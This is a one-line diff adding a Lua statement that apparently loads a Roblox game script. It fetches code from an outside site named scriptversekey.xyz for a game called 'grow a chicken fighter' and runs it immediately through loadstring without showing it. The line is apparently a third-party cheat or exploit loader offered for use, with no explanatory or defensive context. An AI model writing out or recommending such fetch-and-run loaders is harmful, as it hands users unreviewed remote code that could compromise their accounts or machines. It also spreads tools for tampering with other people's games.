@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptversekey.xyz/s/grow-a-chicken-fighter"))()
